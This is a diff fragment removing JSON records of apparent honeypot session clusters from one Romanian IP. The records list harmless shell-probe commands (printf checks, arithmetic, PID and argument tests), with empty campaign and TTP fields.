-        "sh -c 'f_check_95998f4b556d7662af1b4d557eee6770() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_95998f4b556d7662af1b4d557eee6770_small_function'\"'\"' \"$1|$#\"; }; f_check_95998f4b556d7662af1b4d557eee6770 '\"'\"'check_95998f4b556d7662af1b4d557eee6770_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-79d44c3c145e",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:19:28.953284Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-024",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "16d06b4ea0c97b6f",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8ca1e60504bf5c13b272854ce74968f3_small_control'\"'\"' '\"'\"'check_8ca1e60504bf5c13b272854ce74968f3'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_8ca1e60504bf5c13b272854ce74968f3_small_control' 'check_8ca1e60504bf5c13b272854ce74968f3'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8ca1e60504bf5c13b272854ce74968f3_small_math'\"'\"' \"$((110*417+15))\"'",
-        "(110*417+15",
-        "printf '\\n%s|%s\\n' 'check_8ca1e60504bf5c13b272854ce74968f3_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8ca1e60504bf5c13b272854ce74968f3_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_8ca1e60504bf5c13b272854ce74968f3_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_8ca1e60504bf5c13b272854ce74968f3_arg1'\"'\"' '\"'\"'check_8ca1e60504bf5c13b272854ce74968f3_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8ca1e60504bf5c13b272854ce74968f3_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_8ca1e60504bf5c13b272854ce74968f3_arg1' 'check_8ca1e60504bf5c13b272854ce74968f3_arg2'; printf '\\n%s|%s\\n' 'check_8ca1e60504bf5c13b272854ce74968f3_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_8ca1e60504bf5c13b272854ce74968f3() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8ca1e60504bf5c13b272854ce74968f3_small_function'\"'\"' \"$1|$#\"; }; f_check_8ca1e60504bf5c13b272854ce74968f3 '\"'\"'check_8ca1e60504bf5c13b272854ce74968f3_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-237958cace33",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:21:28.037714Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-025",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "6f10534ee8939dd5",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4635680116782c4be86214a3504a36ff_small_control'\"'\"' '\"'\"'check_4635680116782c4be86214a3504a36ff'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_4635680116782c4be86214a3504a36ff_small_control' 'check_4635680116782c4be86214a3504a36ff'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4635680116782c4be86214a3504a36ff_small_math'\"'\"' \"$((28*860+29))\"'",
-        "(28*860+29",
-        "printf '\\n%s|%s\\n' 'check_4635680116782c4be86214a3504a36ff_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4635680116782c4be86214a3504a36ff_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_4635680116782c4be86214a3504a36ff_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_4635680116782c4be86214a3504a36ff_arg1'\"'\"' '\"'\"'check_4635680116782c4be86214a3504a36ff_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4635680116782c4be86214a3504a36ff_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_4635680116782c4be86214a3504a36ff_arg1' 'check_4635680116782c4be86214a3504a36ff_arg2'; printf '\\n%s|%s\\n' 'check_4635680116782c4be86214a3504a36ff_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_4635680116782c4be86214a3504a36ff() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_4635680116782c4be86214a3504a36ff_small_function'\"'\"' \"$1|$#\"; }; f_check_4635680116782c4be86214a3504a36ff '\"'\"'check_4635680116782c4be86214a3504a36ff_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-c9f40fdcc31b",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:23:27.512821Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-026",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "75eb4e1a6e7ddf4c",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_cb5f0b14aa6079c86f15d1a860e4d2ea_small_control'\"'\"' '\"'\"'check_cb5f0b14aa6079c86f15d1a860e4d2ea'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_cb5f0b14aa6079c86f15d1a860e4d2ea_small_control' 'check_cb5f0b14aa6079c86f15d1a860e4d2ea'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_cb5f0b14aa6079c86f15d1a860e4d2ea_small_math'\"'\"' \"$((220*855+72))\"'",
-        "(220*855+72",
-        "printf '\\n%s|%s\\n' 'check_cb5f0b14aa6079c86f15d1a860e4d2ea_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_cb5f0b14aa6079c86f15d1a860e4d2ea_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_cb5f0b14aa6079c86f15d1a860e4d2ea_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_cb5f0b14aa6079c86f15d1a860e4d2ea_arg1'\"'\"' '\"'\"'check_cb5f0b14aa6079c86f15d1a860e4d2ea_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_cb5f0b14aa6079c86f15d1a860e4d2ea_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_cb5f0b14aa6079c86f15d1a860e4d2ea_arg1' 'check_cb5f0b14aa6079c86f15d1a860e4d2ea_arg2'; printf '\\n%s|%s\\n' 'check_cb5f0b14aa6079c86f15d1a860e4d2ea_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_cb5f0b14aa6079c86f15d1a860e4d2ea() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_cb5f0b14aa6079c86f15d1a860e4d2ea_small_function'\"'\"' \"$1|$#\"; }; f_check_cb5f0b14aa6079c86f15d1a860e4d2ea '\"'\"'check_cb5f0b14aa6079c86f15d1a860e4d2ea_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-6f61f2f41f9e",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:25:26.810132Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-027",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "369d6c70ee0e112b",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3ff087a8131428907ec83494caa6716b_small_control'\"'\"' '\"'\"'check_3ff087a8131428907ec83494caa6716b'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_3ff087a8131428907ec83494caa6716b_small_control' 'check_3ff087a8131428907ec83494caa6716b'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3ff087a8131428907ec83494caa6716b_small_math'\"'\"' \"$((417*44+73))\"'",
-        "(417*44+73",
-        "printf '\\n%s|%s\\n' 'check_3ff087a8131428907ec83494caa6716b_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3ff087a8131428907ec83494caa6716b_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_3ff087a8131428907ec83494caa6716b_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_3ff087a8131428907ec83494caa6716b_arg1'\"'\"' '\"'\"'check_3ff087a8131428907ec83494caa6716b_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3ff087a8131428907ec83494caa6716b_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_3ff087a8131428907ec83494caa6716b_arg1' 'check_3ff087a8131428907ec83494caa6716b_arg2'; printf '\\n%s|%s\\n' 'check_3ff087a8131428907ec83494caa6716b_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_3ff087a8131428907ec83494caa6716b() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_3ff087a8131428907ec83494caa6716b_small_function'\"'\"' \"$1|$#\"; }; f_check_3ff087a8131428907ec83494caa6716b '\"'\"'check_3ff087a8131428907ec83494caa6716b_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-c090cb9140d9",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:27:26.298373Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-028",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "5d89b1598e1f7817",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b4e66e9f8c29376ae6f92e9f358b029f_small_control'\"'\"' '\"'\"'check_b4e66e9f8c29376ae6f92e9f358b029f'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_b4e66e9f8c29376ae6f92e9f358b029f_small_control' 'check_b4e66e9f8c29376ae6f92e9f358b029f'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b4e66e9f8c29376ae6f92e9f358b029f_small_math'\"'\"' \"$((449*572+42))\"'",
-        "(449*572+42",
-        "printf '\\n%s|%s\\n' 'check_b4e66e9f8c29376ae6f92e9f358b029f_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b4e66e9f8c29376ae6f92e9f358b029f_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_b4e66e9f8c29376ae6f92e9f358b029f_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_b4e66e9f8c29376ae6f92e9f358b029f_arg1'\"'\"' '\"'\"'check_b4e66e9f8c29376ae6f92e9f358b029f_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b4e66e9f8c29376ae6f92e9f358b029f_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_b4e66e9f8c29376ae6f92e9f358b029f_arg1' 'check_b4e66e9f8c29376ae6f92e9f358b029f_arg2'; printf '\\n%s|%s\\n' 'check_b4e66e9f8c29376ae6f92e9f358b029f_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_b4e66e9f8c29376ae6f92e9f358b029f() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_b4e66e9f8c29376ae6f92e9f358b029f_small_function'\"'\"' \"$1|$#\"; }; f_check_b4e66e9f8c29376ae6f92e9f358b029f '\"'\"'check_b4e66e9f8c29376ae6f92e9f358b029f_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-de7ff21eb9c5",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:29:23.155822Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-029",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "c0c70bf96c8eb338",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f93ab65f0e29716f588232e815a813bb_small_control'\"'\"' '\"'\"'check_f93ab65f0e29716f588232e815a813bb'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_f93ab65f0e29716f588232e815a813bb_small_control' 'check_f93ab65f0e29716f588232e815a813bb'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f93ab65f0e29716f588232e815a813bb_small_math'\"'\"' \"$((992*111+74))\"'",
-        "(992*111+74",
-        "printf '\\n%s|%s\\n' 'check_f93ab65f0e29716f588232e815a813bb_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f93ab65f0e29716f588232e815a813bb_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_f93ab65f0e29716f588232e815a813bb_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_f93ab65f0e29716f588232e815a813bb_arg1'\"'\"' '\"'\"'check_f93ab65f0e29716f588232e815a813bb_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f93ab65f0e29716f588232e815a813bb_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_f93ab65f0e29716f588232e815a813bb_arg1' 'check_f93ab65f0e29716f588232e815a813bb_arg2'; printf '\\n%s|%s\\n' 'check_f93ab65f0e29716f588232e815a813bb_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_f93ab65f0e29716f588232e815a813bb() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_f93ab65f0e29716f588232e815a813bb_small_function'\"'\"' \"$1|$#\"; }; f_check_f93ab65f0e29716f588232e815a813bb '\"'\"'check_f93ab65f0e29716f588232e815a813bb_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-263481f57c38",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:31:19.992322Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-030",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "cc36c0286ec4d9bf",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_bd89d3e5ab826d64ce7c242333520f67_small_control'\"'\"' '\"'\"'check_bd89d3e5ab826d64ce7c242333520f67'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_bd89d3e5ab826d64ce7c242333520f67_small_control' 'check_bd89d3e5ab826d64ce7c242333520f67'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_bd89d3e5ab826d64ce7c242333520f67_small_math'\"'\"' \"$((666*732+22))\"'",
-        "(666*732+22",
-        "printf '\\n%s|%s\\n' 'check_bd89d3e5ab826d64ce7c242333520f67_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_bd89d3e5ab826d64ce7c242333520f67_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_bd89d3e5ab826d64ce7c242333520f67_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_bd89d3e5ab826d64ce7c242333520f67_arg1'\"'\"' '\"'\"'check_bd89d3e5ab826d64ce7c242333520f67_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_bd89d3e5ab826d64ce7c242333520f67_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_bd89d3e5ab826d64ce7c242333520f67_arg1' 'check_bd89d3e5ab826d64ce7c242333520f67_arg2'; printf '\\n%s|%s\\n' 'check_bd89d3e5ab826d64ce7c242333520f67_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_bd89d3e5ab826d64ce7c242333520f67() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_bd89d3e5ab826d64ce7c242333520f67_small_function'\"'\"' \"$1|$#\"; }; f_check_bd89d3e5ab826d64ce7c242333520f67 '\"'\"'check_bd89d3e5ab826d64ce7c242333520f67_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-4f047bfc1f0d",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:33:16.466097Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-031",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "bdf5623ca28f54f5",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_67ac7d6b233d5ef3464ecb80fd58ae78_small_control'\"'\"' '\"'\"'check_67ac7d6b233d5ef3464ecb80fd58ae78'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_67ac7d6b233d5ef3464ecb80fd58ae78_small_control' 'check_67ac7d6b233d5ef3464ecb80fd58ae78'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_67ac7d6b233d5ef3464ecb80fd58ae78_small_math'\"'\"' \"$((619*396+60))\"'",
-        "(619*396+60",
-        "printf '\\n%s|%s\\n' 'check_67ac7d6b233d5ef3464ecb80fd58ae78_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_67ac7d6b233d5ef3464ecb80fd58ae78_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_67ac7d6b233d5ef3464ecb80fd58ae78_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_67ac7d6b233d5ef3464ecb80fd58ae78_arg1'\"'\"' '\"'\"'check_67ac7d6b233d5ef3464ecb80fd58ae78_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_67ac7d6b233d5ef3464ecb80fd58ae78_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_67ac7d6b233d5ef3464ecb80fd58ae78_arg1' 'check_67ac7d6b233d5ef3464ecb80fd58ae78_arg2'; printf '\\n%s|%s\\n' 'check_67ac7d6b233d5ef3464ecb80fd58ae78_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_67ac7d6b233d5ef3464ecb80fd58ae78() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_67ac7d6b233d5ef3464ecb80fd58ae78_small_function'\"'\"' \"$1|$#\"; }; f_check_67ac7d6b233d5ef3464ecb80fd58ae78 '\"'\"'check_67ac7d6b233d5ef3464ecb80fd58ae78_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-572ecf5ba4bc",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:35:13.380211Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-032",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "335762302d14c473",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_69d0b60849331dd2b8a1125deb498e21_small_control'\"'\"' '\"'\"'check_69d0b60849331dd2b8a1125deb498e21'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_69d0b60849331dd2b8a1125deb498e21_small_control' 'check_69d0b60849331dd2b8a1125deb498e21'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_69d0b60849331dd2b8a1125deb498e21_small_math'\"'\"' \"$((170*24+26))\"'",
-        "(170*24+26",
-        "printf '\\n%s|%s\\n' 'check_69d0b60849331dd2b8a1125deb498e21_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_69d0b60849331dd2b8a1125deb498e21_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_69d0b60849331dd2b8a1125deb498e21_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_69d0b60849331dd2b8a1125deb498e21_arg1'\"'\"' '\"'\"'check_69d0b60849331dd2b8a1125deb498e21_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_69d0b60849331dd2b8a1125deb498e21_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_69d0b60849331dd2b8a1125deb498e21_arg1' 'check_69d0b60849331dd2b8a1125deb498e21_arg2'; printf '\\n%s|%s\\n' 'check_69d0b60849331dd2b8a1125deb498e21_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_69d0b60849331dd2b8a1125deb498e21() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_69d0b60849331dd2b8a1125deb498e21_small_function'\"'\"' \"$1|$#\"; }; f_check_69d0b60849331dd2b8a1125deb498e21 '\"'\"'check_69d0b60849331dd2b8a1125deb498e21_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-88396d4c9370",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:37:10.292219Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-033",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "7051f9c3f0582329",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_05a720ad98dcb0f78c2e6f74affc4292_small_control'\"'\"' '\"'\"'check_05a720ad98dcb0f78c2e6f74affc4292'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_05a720ad98dcb0f78c2e6f74affc4292_small_control' 'check_05a720ad98dcb0f78c2e6f74affc4292'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_05a720ad98dcb0f78c2e6f74affc4292_small_math'\"'\"' \"$((451*438+90))\"'",
-        "(451*438+90",
-        "printf '\\n%s|%s\\n' 'check_05a720ad98dcb0f78c2e6f74affc4292_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_05a720ad98dcb0f78c2e6f74affc4292_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_05a720ad98dcb0f78c2e6f74affc4292_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_05a720ad98dcb0f78c2e6f74affc4292_arg1'\"'\"' '\"'\"'check_05a720ad98dcb0f78c2e6f74affc4292_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_05a720ad98dcb0f78c2e6f74affc4292_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_05a720ad98dcb0f78c2e6f74affc4292_arg1' 'check_05a720ad98dcb0f78c2e6f74affc4292_arg2'; printf '\\n%s|%s\\n' 'check_05a720ad98dcb0f78c2e6f74affc4292_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_05a720ad98dcb0f78c2e6f74affc4292() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_05a720ad98dcb0f78c2e6f74affc4292_small_function'\"'\"' \"$1|$#\"; }; f_check_05a720ad98dcb0f78c2e6f74affc4292 '\"'\"'check_05a720ad98dcb0f78c2e6f74affc4292_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-904cfbf7755d",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:39:08.883811Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-034",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "ee8e1888bddd1cdc",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6fc09d96dd7b328e230baba202359790_small_control'\"'\"' '\"'\"'check_6fc09d96dd7b328e230baba202359790'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_6fc09d96dd7b328e230baba202359790_small_control' 'check_6fc09d96dd7b328e230baba202359790'",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6fc09d96dd7b328e230baba202359790_small_math'\"'\"' \"$((693*703+91))\"'",
-        "(693*703+91",
-        "printf '\\n%s|%s\\n' 'check_6fc09d96dd7b328e230baba202359790_small_math' \")\"",
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6fc09d96dd7b328e230baba202359790_small_pid'\"'\"' \"$$\"'",
-        "printf '\\n%s|%s\\n' 'check_6fc09d96dd7b328e230baba202359790_small_pid' \"$$\"",
-        "sh -c 'set -- '\"'\"'check_6fc09d96dd7b328e230baba202359790_arg1'\"'\"' '\"'\"'check_6fc09d96dd7b328e230baba202359790_arg2'\"'\"'; printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6fc09d96dd7b328e230baba202359790_small_positional'\"'\"' \"$#|$1|$2\"'",
-        "set -- 'check_6fc09d96dd7b328e230baba202359790_arg1' 'check_6fc09d96dd7b328e230baba202359790_arg2'; printf '\\n%s|%s\\n' 'check_6fc09d96dd7b328e230baba202359790_small_positional' \"$#|$1|$2\"",
-        "sh -c 'f_check_6fc09d96dd7b328e230baba202359790() { printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_6fc09d96dd7b328e230baba202359790_small_function'\"'\"' \"$1|$#\"; }; f_check_6fc09d96dd7b328e230baba202359790 '\"'\"'check_6fc09d96dd7b328e230baba202359790_function_value'\"'\"''"
-      ],
-      "members": [
-        {
-          "session_id": "IR-fb3e758d388e",
-          "src_ip": "92.118.39.14",
-          "country": "RO",
-          "isp": "DMZHOST",
-          "command_count": 42,
-          "timestamp": "2026-11-17T18:41:07.279048Z"
-        }
-      ]
-    },
-    {
-      "cluster_id": "CLU-035",
-      "is_campaign": false,
-      "campaign_name": null,
-      "campaign_severity": null,
-      "campaign_description": null,
-      "matched_campaigns": [],
-      "session_count": 1,
-      "unique_ips": [
-        "92.118.39.14"
-      ],
-      "unique_ip_count": 1,
-      "sequence_hash": "7dc8142303e0d201",
-      "ttps": [],
-      "representative_commands": [
-        "sh -c 'printf '\"'\"'\\n%s|%s\\n'\"'\"' '\"'\"'check_8e2bf7c83c884bea16c83d3b1f776b6e_small_control'\"'\"' '\"'\"'check_8e2bf7c83c884bea16c83d3b1f776b6e'\"'\"''",
-        "printf '\\n%s|%s\\n' 'check_8e2bf7c83c884bea16c83d3b1f776b6e_small_control' 'check_8e2bf7c83c884bea16c83d3b1f776b6e'",
